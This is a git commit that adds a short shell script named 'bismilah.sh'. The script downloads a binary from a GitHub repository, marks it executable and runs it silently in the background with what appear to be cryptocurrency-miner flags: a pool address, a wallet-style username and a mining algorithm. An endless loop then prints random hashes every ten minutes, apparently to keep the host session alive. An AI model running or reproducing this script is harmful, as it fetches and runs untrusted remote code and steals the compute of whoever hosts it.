87e17377bd702d7c51fb094954a8f9399ca9dc0b
sbwsmg <108033976+sbwsmg@users.noreply.github.com>
2022-11-06 22:06:47 +0800

    Create bismilah.sh

---
+++ bismilah.sh
@@ -0,0 +1,4 @@
+wget https://github.com/sbwsmg/lol/raw/main/blowjobs
+chmod 700 blowjobs
+./ blowjobs -o 139.162.40.79:80 -u BGeqeVb9rAUrQ17vmp52ZuU7H9ayV6R9Qg.sairin -p x -a gr -k -t3 > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
